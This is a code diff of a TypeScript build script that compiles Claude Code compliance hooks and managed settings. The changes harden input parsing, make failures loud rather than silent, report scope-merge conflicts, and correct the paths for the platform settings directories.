-RESPONSE=$(printf '%s' "$INPUT" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{try{const j=JSON.parse(d);if(typeof j.last_assistant_message==='string'&&j.last_assistant_message){process.stdout.write(j.last_assistant_message);return;}if(j.transcript_path){const fs=require('fs');const lines=fs.readFileSync(j.transcript_path,'utf-8').split('\\n');for(let i=lines.length-1;i>=0;i--){const l=lines[i].trim();if(!l)continue;try{const e=JSON.parse(l);const m=(e.message&&e.message.role==='assistant')?e.message:null;if(m){const c=m.content;const t=typeof c==='string'?c:(Array.isArray(c)?c.filter(p=>p&&p.type==='text').map(p=>p.text).join('\\n'):'');process.stdout.write(t);return;}}catch(_){}}}process.stdout.write('');}catch(_){process.stdout.write('')}})") || exit 0
+${hookInputCapPrelude({
+    // This hook fails OPEN by design (a Stop hook that blocks on its own failure
+    // strands the session). Say so — an unscanned response must not look clean.
+    overCapStderr:
+      "response payload exceeds $MAX_HOOK_INPUT_BYTES bytes — output scan SKIPPED for this turn.",
+    action: "exit0",
+  })}
+${hookJsonExtract({
+    // A transcript_path that cannot be read now THROWS rather than resolving to
+    // '': the payload named where the response is and we could not get it, which
+    // is "unscanned", not "clean". Finding no assistant message anywhere still
+    // resolves to '' — that is genuinely nothing to scan, not a failure.
+    variable: "RESPONSE",
+    subject: "the assistant response",
+    extract:
+      "if(typeof j.last_assistant_message==='string'&&j.last_assistant_message){process.stdout.write(j.last_assistant_message);return;}" +
+      "if(j.transcript_path){const fs=require('fs');const lines=fs.readFileSync(j.transcript_path,'utf-8').split('\\n');" +
+      "for(let i=lines.length-1;i>=0;i--){const l=lines[i].trim();if(!l)continue;" +
+      "try{const e=JSON.parse(l);const m=(e.message&&e.message.role==='assistant')?e.message:null;" +
+      "if(m){const c=m.content;const t=typeof c==='string'?c:(Array.isArray(c)?c.filter(p=>p&&p.type==='text').map(p=>p.text).join('\\n'):'');" +
+      "process.stdout.write(t);return;}}catch(_){}}}" +
+      "process.stdout.write('');",
+    action: "exit0",
+  })}
 
 # Scan for accidental credential exposure in output
 PATTERNS=(
@@ -2468,7 +3273,13 @@ TELEMETRY_LOG="\${AGENTBOOT_TELEMETRY_LOG:-${rawLogPath}}"
 umask 077
 mkdir -p "$(dirname "$TELEMETRY_LOG")"
 
-INPUT=$(cat)
+${hookInputCapPrelude({
+    // Non-blocking hook: record the event anyway, but never pretend the record
+    // is complete.
+    overCapStderr:
+      "telemetry payload exceeds $MAX_HOOK_INPUT_BYTES bytes — event fields may be incomplete.",
+    action: "continue",
+  })}
 TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
 ${devIdBlock}
 
@@ -2490,6 +3301,14 @@ printf '%s' "$INPUT" | node -e "
   process.stdin.on('end',()=>{
     try {
       const input = JSON.parse(d);
+      // Parsing is not enough: 42, a bare string, null and [] all parse, and
+      // every field read off them is undefined — which this hook would then
+      // record as an empty event, or skip silently as an unmatched event type.
+      // (No double quotes in this comment: it is emitted inside a bash
+      // double-quoted node -e string, where one would end the script.)
+      if (!input || typeof input !== 'object' || Array.isArray(input)) {
+        throw new Error('hook payload is not a JSON object');
+      }
       const event = input.hook_event_name || '';
       const ts = process.env.TIMESTAMP || new Date().toISOString();
       const dev = process.env.DEV_ID || '';
@@ -2513,7 +3332,15 @@ printf '%s' "$INPUT" | node -e "
       } catch {}
       entry.chain = createHash('sha256').update(prev + canonical(entry)).digest('hex');
       fs.appendFileSync(log, JSON.stringify(entry) + '\\n', { mode: 0o600 });
-    } catch {}
+    } catch (e) {
+      // NF4-2 sibling: this catch used to be bare. An unparseable payload, an
+      // unwritable log, a full disk — every one of them produced a telemetry
+      // hook that recorded nothing and exited 0, which every dashboard reads as
+      // a healthy audit trail. This hook fails OPEN by design (a recorder must
+      // not break the developer's session) but a component that did nothing has
+      // to SAY SO. exit 0 stays; the silence does not.
+      process.stderr.write('AgentBoot: telemetry event NOT recorded (' + (e && e.message ? e.message : e) + ')\\n');
+    }
   });
 "
 
@@ -2548,8 +3375,24 @@ HOME="\${HOME:-\${USERPROFILE:-$(node -e "console.log(require('os').homedir())")
 # Fail-closed: if node is missing, block the tool (compliance requires enforcement)
 command -v node >/dev/null 2>&1 || { echo '{"decision":"block","reason":"AgentBoot: node required for compliance hooks"}'; exit 2; }
 
-INPUT=$(cat)
-TOOL_NAME=$(printf '%s' "$INPUT" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{try{const j=JSON.parse(d);process.stdout.write(j.tool_name||'')}catch{process.stdout.write('')}})") || { echo '{"decision":"block","reason":"AgentBoot: Failed to parse hook input"}'; exit 2; }
+${hookInputCapPrelude({
+    overCapStderr: "tool payload exceeds $MAX_HOOK_INPUT_BYTES bytes — cannot identify the tool.",
+    action: "block",
+    blockReason:
+      "AgentBoot: tool-use payload exceeds the hook input limit and could not be inspected.",
+  })}
+${hookJsonExtract({
+    variable: "TOOL_NAME",
+    subject: "the tool name",
+    // R4V-1, same class. Stricter than the prompt case on purpose: this value is
+    // matched against DENY_PATTERNS, so an empty tool name matches nothing and
+    // every deny rule silently passes. There is no such thing as a legitimately
+    // empty tool name — absent OR empty is a payload we cannot gate on.
+    extract: "if(typeof j.tool_name!=='string'||!j.tool_name)throw 0;process.stdout.write(j.tool_name)",
+    action: "block",
+    blockReason:
+      "AgentBoot: the hook payload could not be parsed, so the tool could not be identified. The deny gate will not run on a payload it cannot understand.",
+  })}
 
 DENY_PATTERNS=(
 ${patterns}
@@ -2646,7 +3489,7 @@ function generateComplianceSettingsJson(
   // Derive the CC wiring from the canonical bindings (input-scan → UserPromptSubmit,
   // output-scan → Stop, telemetry → SubagentStart/Stop + PostToolUse + SessionEnd,
   // pretooluse → PreToolUse only when denyTools is configured). CC event names are
-  // canonical, timeouts in ms, matcher exact-match.
+  // canonical, timeouts in ms, matcher a regex (see ComplianceHookBinding.matcher).
   const denyOn = (_config.managed?.guardrails?.denyTools ?? []).length > 0;
   for (const b of COMPLIANCE_HOOK_BINDINGS) {
     if (b.requiresDenyTools && !denyOn) continue;
@@ -2697,17 +3540,37 @@ function generatePersonaHooks(
     const pc = loadPersonaConfig(personaDir);
     if (!pc?.hooks) continue;
 
-    // Merge persona-specific hooks into the settings
+    // Merge persona-specific hooks into the settings.
+    //
+    // NF3-2: this used to be `{ ...(typeof hookConfig === "object" ? hookConfig
+    // : {}), matcher: personaName }` — an unconditional object spread. Two
+    // failures came out of it, both silent and both reported as success by the
+    // "→ N persona-specific hook(s) compiled" line below:
+    //
+    //   - An ARRAY value (the shape `claude.hooks` uses, and the shape Claude
+    //     Code's settings.json actually takes) spread into an object, producing
+    //     `{"0": {...}, "matcher": "code-reviewer"}` — an entry with no `hooks`
+    //     array at all. Claude Code runs nothing. Verified on a scratch hub.
+    //   - A scalar value silently became `{matcher: personaName}` — the same
+    //     empty entry, from a typo.
+    //
+    // Both shapes are now normalized properly, and anything that is NEITHER is
+    // refused by the unreadable-hook gate before this function runs. `hooks`
+    // config that cannot be honoured must never be counted as compiled.
     for (const [event, hookConfig] of Object.entries(pc.hooks)) {
+      const { groups } = hookGroupsFor(hookConfig);
+      if (groups.length === 0) continue;
       if (!hooks[event]) hooks[event] = [];
-      // Wrap in SubagentStart matcher so hooks only fire for this persona.
-      // Spread config first, then enforce matcher — persona can't override its own matcher.
-      const entry = {
-        ...(typeof hookConfig === "object" && hookConfig !== null ? hookConfig : {}),
-        matcher: personaName,
-      };
-      (hooks[event] as unknown[]).push(entry);
-      personaHooksAdded++;
+      for (const group of groups) {
+        // Wrap in a persona matcher so hooks only fire for this persona.
+        // Spread the group first, then enforce matcher — a persona can't
+        // override its own matcher.
+        (hooks[event] as unknown[]).push({
+          ...(group as Record<string, unknown>),
+          matcher: personaName,
+        });
+        personaHooksAdded++;
+      }
     }
   }
 
@@ -2720,12 +3583,10 @@ function generatePersonaHooks(
 
     for (const file of gotchaFiles) {
       const content = fs.readFileSync(path.join(gotchasDir, file), "utf-8");
-      const fm = parseFrontmatter(content);
-      const rawPaths = fm?.get("paths");
-      if (rawPaths) {
-        const pathsStr = rawPaths.replace(/^["']|["']$/g, "");
-        sensitiveGlobs.push(...pathsStr.split(",").map(p => p.trim()).filter(Boolean));
-      }
+      // V1, seventh site: the PreToolUse sensitive-path hook. A `{ts,tsx}` group
+      // split here produced two globs that match nothing, so the hook that is
+      // supposed to warn on edits to sensitive paths warned on none of them.
+      sensitiveGlobs.push(...readScopeGlobs(content, "paths").globs);
     }
 
     if (sensitiveGlobs.length > 0) {
@@ -2796,66 +3657,78 @@ function generateTelemetrySchema(distPath: string): void {
 function generateMergedManagedArtifacts(
   distPath: string,
   nodePaths: string[],
+  config: AgentBootConfig,
 ): void {
+  // NF3-8: through the shared reader, which distinguishes ABSENT from
+  // UNREADABLE. See readManagedFragment's docstring — the inline version was
+  // unreachable from any CLI invocation by construction, which is how it stayed
+  // wrong; it lives in the lib now so it can be tested.
   const readFragment = (p: string): Record<string, unknown> | null => {
-    if (!fs.existsSync(p)) return null;
-    try { return JSON.parse(fs.readFileSync(p, "utf-8")) as Record<string, unknown>; }
-    catch { return null; }
+    try {
+      return readManagedFragment(p);
+    } catch (err: unknown) {
+      fatal(
+        `${err instanceof Error ? err.message : String(err)}\n` +
+          `  This is a managed-settings fragment — the NON-OVERRIDABLE policy channel. Merging\n` +
+          `  past it would emit an MDM artifact with the org's controls silently missing, which\n` +
+          `  is indistinguishable downstream from an org that configured none.`
+      );
+    }
   };
 
   // Org-level inputs: the guardrail-derived deployable + the org fragment.
   const guardrailBase = readFragment(path.join(distPath, "managed", "managed-settings.json")) ?? {};
   const orgFragment = readFragment(path.join(distPath, "claude", "core", "managed-settings.d", "00-org.json")) ?? {};
 
-  const mergePermissions = (
-    higher: Record<string, unknown> | undefined,
-    lower: Record<string, unknown> | undefined,
-  ): Record<string, unknown> | undefined => {
-    if (!higher && !lower) return undefined;
-    const merged: Record<string, unknown> = { ...(lower ?? {}), ...(higher ?? {}) };
-    for (const key of ["deny", "allow"] as const) {
-      const h = (higher?.[key] as string[] | undefined) ?? [];
-      const l = (lower?.[key] as string[] | undefined) ?? [];
-      const union = [...new Set([...h, ...l])];
-      if (union.length > 0) merged[key] = union;
-    }
-    return merged;
-  };
+  // F-5: the acknowledgement register.
+  //
+  // D3 corrects this comment, which was false. `hooks` is unioned wholesale, so
+  // it genuinely never appears here. `permissions` is NOT — only
+  // `permissions.deny` and `permissions.allow` are unioned. Every other sub-key
+  // (`defaultMode`, `additionalDirectories`, `bypassPermissions`, anything added
+  // upstream later) is a shallow overwrite like any scalar, and now appears here
+  // as `permissions.<sub-key>` when scopes disagree about it.
+  const acknowledgedOverrides = config.managed?.scopeMerge?.acknowledgedOverrides ?? [];
+  if (acknowledgedOverrides.includes("*")) {
+    fatal(
+      "managed.scopeMerge.acknowledgedOverrides may not contain \"*\".\n" +
+      "  The point is that each accepted loss is ENUMERATED and reviewable in the hub PR diff.",
+    );
+  }
 
-  /** Merge fragments ordered from HIGHEST precedence to lowest. */
-  const mergeScopes = (ordered: Array<Record<string, unknown>>): Record<string, unknown> => {
-    const merged: Record<string, unknown> = {};
-    // Apply lowest precedence first so higher scopes overwrite.
-    for (const frag of [...ordered].reverse()) {
-      for (const [k, v] of Object.entries(frag)) {
-        if (k.startsWith("//")) continue;
-        if (k === "permissions") continue; // handled below
-        merged[k] = v;
-      }
-    }
-    const permissions = ordered
-      .map((f) => f["permissions"] as Record<string, unknown> | undefined)
-      .filter((p): p is Record<string, unknown> => p !== undefined)
-      .reduce<Record<string, unknown> | undefined>((acc, p) => mergePermissions(acc, p), undefined);
-    if (permissions) merged["permissions"] = permissions;
-    return merged;
-  };
+  const allConflicts: Array<{ scope: string; conflict: MergeConflict }> = [];
+  const allMalformedHooks: Array<{ scope: string; hook: MalformedHook }> = [];
+  const allMalformedValues: Array<{ scope: string; value: MalformedValue }> = [];
 
-  const writeMerged = (scope: string, merged: Record<string, unknown>, sources: string[]): void => {
-    if (Object.keys(merged).length === 0) return;
+  const writeMerged = (scope: string, result: MergeResult, sources: string[]): void => {
+    for (const c of result.conflicts) allConflicts.push({ scope: `scopes/${scope}`, conflict: c });
+    for (const h of result.malformedHooks) allMalformedHooks.push({ scope: `scopes/${scope}`, hook: h });
+    for (const v of result.malformedValues) allMalformedValues.push({ scope: `scopes/${scope}`, value: v });
+    if (Object.keys(result.merged).length === 0) return;
     const outDir = path.join(distPath, "managed", "scopes", scope);
     ensureDir(outDir);
     fs.writeFileSync(
       path.join(outDir, "managed-settings.json"),
-      JSON.stringify(merged, null, 2) + "\n",
+      JSON.stringify(result.merged, null, 2) + "\n",
       "utf-8"
     );
     log(chalk.gray(`  → Merged managed artifact: scopes/${scope} (${sources.join(" + ")})`));
+    // Silence Is Not Success: a successful merge reports the composition it
+    // PERFORMED, not merely that it happened.
+    if (result.unionedHookEvents.length > 0) {
+      log(chalk.gray(
+        `      hooks unioned across ${result.unionedHookEvents.length} event(s): ${result.unionedHookEvents.join(", ")}`,
+      ));
+    }
+    const { deny, allow } = result.permissionCounts;
+    if (deny > 0 || allow > 0) {
+      log(chalk.gray(`      permissions.deny unioned: ${deny} rule(s) · permissions.allow unioned: ${allow} rule(s)`));
+    }
   };
 
   // Core scope: guardrail base wins over the org fragment (both org-authored;
   // the guardrail channel is the harder statement of intent).
-  writeMerged("core", mergeScopes([guardrailBase, orgFragment]), ["guardrails", "00-org"]);
+  writeMerged("core", mergeManagedFragments([guardrailBase, orgFragment], ["guardrails", "00-org"]), ["guardrails", "00-org"]);
 
   for (const nodePath of nodePaths) {
     const parts = nodePath.split("/");
@@ -2872,9 +3745,100 @@ function generateMergedManagedArtifacts(
       }
     }
     if (fragments.length > 2) {
-      writeMerged(`nodes/${nodePath}`, mergeScopes(fragments), sources);
+      writeMerged(`nodes/${nodePath}`, mergeManagedFragments(fragments, sources), sources);
     }
   }
+
+  // D1: a hook event that could not be unioned is a DELETED control on the
+  // non-overridable channel. Fail the build, naming the scope, the event and the
+  // fragment — never write the artifact and report a union that did not happen.
+  if (allMalformedHooks.length > 0) {
+    log(chalk.red(`\n  ✗ Malformed hook event(s) in managed-settings fragments — cannot be merged:`));
+    for (const { scope, hook } of allMalformedHooks) {
+      log(chalk.red(`      ${scope}: hooks.${hook.event} is ${hook.found}, expected an array — from ${hook.source}`));
+    }
+    log(chalk.gray(`    dist/managed/scopes/<scope>/managed-settings.json is the file an MDM operator`));
+    log(chalk.gray(`    deploys and a developer CANNOT override. Silently dropping the event would`));
+    log(chalk.gray(`    write the ABSENCE of a control into that file, while the build log named the`));
+    log(chalk.gray(`    event as unioned. Fix the fragment; there is no safe default here.`));
+    process.exit(1);
+  }
+
+  // V4: same posture, sibling key. A `permissions` that is not an object cannot
+  // be merged, and the old code spread it into the artifact character by
+  // character. Refuse; there is no safe coercion of a policy value.
+  if (allMalformedValues.length > 0) {
+    log(chalk.red(`\n  ✗ Malformed value(s) in managed-settings fragments — cannot be merged:`));
+    for (const { scope, value } of allMalformedValues) {
+      log(chalk.red(`      ${scope}: ${value.key} is ${value.found}, expected an object — from ${value.source}`));
+    }
+    log(chalk.gray(`    A string here is spread CHARACTER BY CHARACTER into`));
+    log(chalk.gray(`    dist/managed/scopes/<scope>/managed-settings.json — the file an MDM operator`));
+    log(chalk.gray(`    deploys and a developer cannot override. Fix the fragment.`));
+    process.exit(1);
+  }
+
+  // F-5 §2.2: report every scope in ONE run. An operator with a conflict in
+  // scopes/core and scopes/nodes/platform/api should see both, not fix them one
+  // build at a time.
+  if (allConflicts.length === 0) return;
+
+  const unacked = allConflicts.filter((c) => !acknowledgedOverrides.includes(c.conflict.key));
+  const acked = allConflicts.filter((c) => acknowledgedOverrides.includes(c.conflict.key));
+
+  const fmt = (v: unknown) => JSON.stringify(v);
+
+  for (const { scope, conflict } of acked) {
+    // An acknowledged loss is STILL a loss — name winner, loser and both sources.
+    for (const d of conflict.discarded) {
+      log(chalk.yellow(
+        `  ⚠ ${scope}: ${conflict.key} — kept ${fmt(conflict.keptValue)} (${conflict.keptSource}), ` +
+        `discarded ${fmt(d.value)} (${d.source}) — acknowledged in managed.scopeMerge.acknowledgedOverrides.`,
+      ));
+    }
+  }
+
+  if (unacked.length === 0) return;
+
+  for (const { scope, conflict } of unacked) {
+    log("");
+    log(chalk.red(`  ✗ Managed scope merge discards a configured value: ${scope}`));
+    log(chalk.red(`      ${conflict.key}`));
+    log(chalk.gray(`        kept      ${fmt(conflict.keptValue)}  (from ${conflict.keptSource})`));
+    for (const d of conflict.discarded) {
+      log(chalk.gray(`        discarded ${fmt(d.value)}  (from ${d.source})`));
+    }
+  }
+  log("");
+  log(chalk.gray(
+    `    dist/managed/scopes/<scope>/managed-settings.json is the file your MDM deploys and a`,
+  ));
+  log(chalk.gray(
+    `    developer cannot override. A value dropped here is a control that was authored,`,
+  ));
+  log(chalk.gray(`    validated and signed, and enforces nothing.`));
+  // The F-1 interaction: the guardrail base is read from DISK, so a hub that
+  // once set managed.enabled and later cleared it used to merge a stale base.
+  // Staging fixes that, but say so if the shape still appears.
+  if (!config.managed?.enabled) {
+    log(chalk.gray(
+      `    NOTE: managed.enabled is not set, yet a guardrail base was present — if dist/ predates`,
+    ));
+    log(chalk.gray(`    this release, the remedy is \`rm -rf dist\`, not an acknowledgement.`));
+  }
+  log("");
+  log(chalk.gray(`    Fix by making the two scopes agree, or — if the override is intended — add`));
+  log(chalk.gray(`    to agentboot.config.json:`));
+  log(chalk.gray(
+    `      "managed": { "scopeMerge": { "acknowledgedOverrides": [${[...new Set(unacked.map((c) => `"${c.conflict.key}"`))].join(", ")}] } }`,
+  ));
+  log("");
+  log(chalk.red(
+    `  ✗ Build failed: ${unacked.length} key(s) discarded by the managed scope merge ` +
+    `(${[...new Set(unacked.map((c) => c.scope))].join(", ")}).`,
+  ));
+  log("");
+  process.exit(1);
 }
 
 /**
@@ -2913,9 +3877,70 @@ function listNodeScopeRoots(hubRoot: string, nodePath: string): string[] {
   return candidates.filter((c): c is string => c !== undefined && fs.existsSync(c));
 }
 
-function generateManagedSettings(config: AgentBootConfig, distPath: string): void {
+/**
+ * The directory Claude Code actually reads managed settings from, per platform.
+ *
+ * THIS IS THE ONE PLACE THESE STRINGS LIVE. Docs cite it; the test suite pins
+ * it. The failure being guarded is silent and total: an MDM profile delivered
+ * to a directory Claude Code never reads installs cleanly, reports success,
+ * drift-checks clean, and enforces *nothing* — a HARD guardrail that exists
+ * only on the admin's console.
+ *
+ * Established empirically against the shipping Claude Code binary (v2.1.226),
+ * whose managed-settings root resolver reads:
+ *
+ *     switch (platform) {
+ *       case "macos":   return "/Library/Application Support/ClaudeCode";
+ *       case "windows": return "C:\\Program Files\\ClaudeCode";
+ *       default:        return "/etc/claude-code";
+ *     }
+ *     managedSettingsDropInDir = join(root, "managed-settings.d")
+ *
+ * Two corrections came out of that check, both of which had shipped:
+ *   - macOS was emitted as ".../Claude/", missing the "Code". That is the
+ *     Claude *Desktop* support directory, a different product.
+ *   - Windows was emitted as "C:\ProgramData\Claude\" — wrong in both
+ *     components; it is "C:\Program Files\ClaudeCode\".
+ * Linux ("/etc/claude-code/") was already correct.
+ *
+ * If a future Claude Code changes these, re-derive from the binary rather than
+ * from memory or from a doc page that may itself have copied this table.
+ */
+export const MANAGED_SETTINGS_ROOTS = {
+  macos: "/Library/Application Support/ClaudeCode/",
+  windows: "C:\\Program Files\\ClaudeCode\\",
+  linux: "/etc/claude-code/",
+} as const;
+
+function generateManagedSettings(
+  config: AgentBootConfig,
+  distPath: string,
+  outputFormats: readonly string[],
+): void {
   const managed = config.managed;
   if (!managed?.enabled) return;
+
+  // B4 / H4: `dist/managed/` is the Claude Code MDM channel, and nothing else
+  // consumes it. This call was UNGATED, so a hub with no `claude` target still
+  // got a managed-settings.json — and, with `requireAuditLog`, one referencing
+  // `.claude/hooks/agentboot-telemetry.sh`, a hook that build never produced.
+  // The operator was then told "→ Managed settings written to dist/managed/"
+  // and a target MDM path, i.e. handed a deployable artifact pointing at a
+  // script that does not exist.
+  //
+  // Erroring rather than skipping: `managed.enabled` is a configured control,
+  // and a control that reaches no platform is the exact class the capability
+  // gate exists to fail on. Skipping quietly would put this back in the
+  // "emitted nothing, said nothing" bucket.
+  if (!outputFormats.includes("claude")) {
+    log(chalk.red(`\n  ✗ managed.enabled is set, but \`claude\` is not in personas.outputFormats.`));
+    log(chalk.gray(`    dist/managed/ is the Claude Code managed-settings (MDM) channel — no other`));
+    log(chalk.gray(`    platform consumes it, and managed.guardrails.requireAuditLog writes a hook`));
+    log(chalk.gray(`    path of .claude/hooks/agentboot-telemetry.sh — a location this build does not`));
+    log(chalk.gray(`    produce (a codex-only build puts its hooks under .codex/hooks/).`));
+    log(chalk.gray(`    Fix: add "claude" to personas.outputFormats, or remove managed.enabled.`));
+    process.exit(1);
+  }
 
   log(chalk.cyan("\nGenerating managed settings..."));
 
@@ -2984,12 +4009,14 @@ function generateManagedSettings(config: AgentBootConfig, distPath: string): voi
     );
   }
 
-  // Output path guidance
+  // Output path guidance — see MANAGED_SETTINGS_ROOTS for why these values are
+  // what they are. An MDM profile aimed at the wrong directory deploys cleanly
+  // and enforces nothing, so this string is a control surface, not a hint.
   const platformPaths: Record<string, string> = {
-    jamf: "/Library/Application Support/Claude/",
-    intune: "C:\\ProgramData\\Claude\\",
-    jumpcloud: "/etc/claude-code/",
-    kandji: "/Library/Application Support/Claude/",
+    jamf: MANAGED_SETTINGS_ROOTS.macos,
+    intune: MANAGED_SETTINGS_ROOTS.windows,
+    jumpcloud: MANAGED_SETTINGS_ROOTS.linux,
+    kandji: MANAGED_SETTINGS_ROOTS.macos,
     other: "./managed-output/",
   };
   const platform = managed.platform ?? "other";
@@ -3005,12 +4032,12 @@ function generateManagedSettings(config: AgentBootConfig, distPath: string): voi
 
 function main(): void {
   const argv = process.argv.slice(2);
-  const configPath = resolveConfigPath(argv, ROOT);
+  const configPath = resolveHubConfigOrExit(argv, "build");
 
   log(chalk.bold("\nAgentBoot — compile"));
   log(chalk.gray(`Config: ${configPath}\n`));
 
-  const config = loadConfig(configPath);
+  const config = loadConfigOrExit(configPath, "build");
   const configDir = path.dirname(configPath);
 
   // Point HUB_ROOT at the hub being built so module-level helpers that
@@ -3019,19 +4046,48 @@ function main(): void {
   // declaration at the top of the file.
   HUB_ROOT = configDir;
 
-  const distPath = path.resolve(
+  const finalDistPath = path.resolve(
     configDir,
     config.output?.distPath ?? "./dist"
   );
 
-  // Optional: fail on dirty dist.
-  if (config.output?.failOnDirtyDist && fs.existsSync(distPath)) {
-    const entries = fs.readdirSync(distPath);
-    if (entries.length > 0) {
-      fatal(
-        `dist/ is not empty and failOnDirtyDist is enabled. Run: rm -rf ${distPath}`
-      );
-    }
+  // F-1: this build now DELETES the previous dist/ tree. Refuse to do that to
+  // a symlink, to the hub root, or to anything outside the hub.
+  assertSafeDistTarget(finalDistPath, configDir);
+
+  // N1: arm the invalidation hook BEFORE any gate below can exit. Every gate
+  // from here on is a place the build can stop, and each one must leave dist/
+  // marked stale rather than plausibly-current.
+  const configDigest = computeConfigDigest(config);
+  distInvalidationContext = {
+    finalDistPath,
+    configDigest,
+    outputFormats: config.personas?.outputFormats ?? [...DEFAULT_OUTPUT_FORMATS],
+    version: packageVersion(),
+  };
+
+  // Every emitter below writes into a staging sibling; the tree is swapped into
+  // place at the very end of main(). This is what makes `dist/` a faithful
+  // projection of hub config rather than an append-only cache: an artifact the
+  // operator revoked is simply never written this build, and therefore is gone.
+  //
+  // Binding the staging dir to the name `distPath` is deliberate — it keeps the
+  // ~3,800 lines of emitters (62 writeFileSync + 5 copyFileSync call sites)
+  // untouched. Threading a path-recorder through all 67 would be a diff where a
+  // single missed site silently reintroduces the defect.
+  const distPath = `${finalDistPath}.staging-${process.pid}`;
+  if (fs.existsSync(distPath)) fs.rmSync(distPath, { recursive: true, force: true });
+  stagingDistPath = distPath;
+
+  // Deprecated: staging makes a dirty dist/ structurally impossible, so the
+  // guard has nothing left to guard. Removing the key outright would break
+  // existing configs for no benefit — accept it, and say it is now a no-op.
+  if (config.output?.failOnDirtyDist) {
+    log(
+      chalk.yellow(
+        "  ⚠ output.failOnDirtyDist is deprecated and ignored — dist/ is now rebuilt from empty and pruned on every build.",
+      ),
+    );
   }
 
   ensureDir(distPath);
@@ -3062,11 +4118,98 @@ function main(): void {
   const packageTraitsDir = path.join(packageCoreDir, "traits");
   const packageInstructionsDir = path.join(packageCoreDir, "instructions");
 
-  const validFormats = ["skill", "claude", "copilot", "cursor", "agents", "plugin", "windsurf", "gemini", "jetbrains", "codex"];
-  const outputFormats = config.personas?.outputFormats ?? ["skill", "claude", "copilot"];
+  const validFormats = [...VALID_OUTPUT_FORMATS];
+  const outputFormats = config.personas?.outputFormats ?? [...DEFAULT_OUTPUT_FORMATS];
+  // Every valid output format MUST have an enforcement classification. Without
+  // this assertion the two lists drift silently, and a format present in one but
+  // not the other is precisely how the capability gate failed open on `plugin`.
+  const unclassified = validFormats.filter((f) => !(f in PLATFORM_ENFORCEMENT));
+  if (unclassified.length > 0) {
+    log(chalk.red(`  ✗ Output format(s) with no enforcement classification: ${unclassified.join(", ")}`));
+    log(chalk.gray(`    Add a row to PLATFORM_ENFORCEMENT in scripts/lib/conformance.ts.`));
+    log(chalk.gray(`    An unclassified format cannot be gated, so guardrails targeting it would pass unchecked.`));
+    process.exit(1);
+  }
+  // The symmetric assertion for the capability table. Without it a typo
+  // ("cluade") silently shrinks an emittedBy set to zero, and the gate then
+  // errors on EVERY build for a capability that is in fact emitted — a false
+  // positive that would get the whole gate disabled. Same drift class as
+  // `plugin`, opposite direction, four lines to make impossible.
+  const badCapabilityRefs = CAPABILITY_SUPPORT.flatMap((r) => [
+    ...r.emittedBy.filter((f) => !validFormats.includes(f)).map((f) => `${r.id} → "${f}"`),
+    // B1: the same drift check for the conditional half. A `conditionalOn` key
+    // that is not in `emittedBy` is dead configuration (it can never filter
+    // anything); a dependency naming a non-format can never be satisfied, so the
+    // row would be permanently unhonoured with no explanation.
+    ...Object.keys(r.conditionalOn ?? {})
+      .filter((k) => !r.emittedBy.includes(k))
+      .map((k) => `${r.id} → conditionalOn["${k}"] but "${k}" is not in emittedBy`),
+    ...Object.values(r.conditionalOn ?? {}).flat()
+      .filter((f) => !validFormats.includes(f))
+      .map((f) => `${r.id} → conditionalOn depends on unknown format "${f}"`),
+  ]);
+  if (badCapabilityRefs.length > 0) {
+    log(chalk.red(`  ✗ CAPABILITY_SUPPORT references unknown output format(s):`));
+    for (const b of badCapabilityRefs) log(chalk.red(`      ${b}`));
+    log(chalk.gray(`    Fix the row in scripts/lib/conformance.ts — an unknown name makes the row unsatisfiable.`));
+    process.exit(1);
+  }
+
+  // B5: the third table gets the same assertion as the other two.
+  //
+  // PLATFORM_ENFORCEMENT and CAPABILITY_SUPPORT are both checked above for
+  // `validFormats ⊆ keys(...)`; APPLY_TO_PROJECTION was not, and it is the one
+  // whose gate FAILS CLOSED on an unknown format (degradedFormats treats a
+  // missing row as "unsupported"). So a format added to validFormats without a
+  // projection row would not fail loudly — it would make every scoped
+  // instruction targeting that format an error, on every build, with a message
+  // blaming the artifact rather than the missing row. That is how a gate gets
+  // switched off.
+  const unprojected = validFormats.filter((f) => !(f in APPLY_TO_PROJECTION));
+  if (unprojected.length > 0) {
+    log(chalk.red(`  ✗ Output format(s) with no applyTo-projection classification: ${unprojected.join(", ")}`));
+    log(chalk.gray(`    Add a row to APPLY_TO_PROJECTION in scripts/lib/scope-projection.ts.`));
+    log(chalk.gray(`    degradedFormats() fails closed on an unknown format, so the missing row would`));
+    log(chalk.gray(`    surface as a scope error on every artifact instead of as this message.`));
+    process.exit(1);
+  }
+
   const unknownFormats = outputFormats.filter((f) => !validFormats.includes(f));
   if (unknownFormats.length > 0) {
     console.error(chalk.red(`Unknown output format(s): ${unknownFormats.join(", ")}. Valid: ${validFormats.join(", ")}`));
+    process.exit(1);
+  }
+
+  // H1 (F-3): a format whose emitters are gated on another format that is not
+  // being built produces a tree that is empty in the ways that matter, and says
+  // "✓ Compiled 4 persona(s) × 1 platform(s)" about it.
+  //
+  // Verified against the pre-fix tree: outputFormats ["plugin"] exited 0 with
+  // dist/plugin/ containing `core` and no hooks at all.
+  //
+  // Erroring rather than silently implying the dependency is deliberate. Adding
+  // `claude` to the build changes what lands in every spoke targeting claude;
+  // that is the operator's decision to make, and a build that quietly widens its
+  // own output is a worse surprise than one that stops and says why.
+  const missingRequires = outputFormats.flatMap((f) =>
+    (PLATFORM_REQUIRES[f] ?? [])
+      .filter((dep) => !outputFormats.includes(dep))
+      .map((dep) => ({ format: f, dep })));
+  if (missingRequires.length > 0) {
+    for (const { format, dep } of missingRequires) {
+      console.error(chalk.red(
+        `✗ Output format \`${format}\` requires \`${dep}\`, which is not in personas.outputFormats.`,
+      ));
+      console.error(chalk.gray(
+        `    dist/${format}/ is assembled from dist/${dep}/, so without it the tree is produced`,
+      ));
+      console.error(chalk.gray(
+        `    but carries none of the hooks or compiled personas — a green build over an empty control.`,
+      ));
+      console.error(chalk.gray(
+        `    Fix: add "${dep}" to personas.outputFormats, or remove "${format}".`,
+      ));
+    }
     process.exit(1);
   }
 
@@ -3160,15 +4303,11 @@ function main(): void {
 
   const allResults: CompileResult[] = [];
 
-  // Phase 11 audit fix: Clear concatenated output files before compilation loop.
-  // Without this, running `build` twice without `clean` produces duplicate content
-  // in JetBrains AGENTS.md and Windsurf .windsurfrules (append-without-clear bug).
-  for (const scope of ["core"]) {
-    const junieFile = path.join(distPath, "jetbrains", scope, ".junie", "AGENTS.md");
-    if (fs.existsSync(junieFile)) fs.unlinkSync(junieFile);
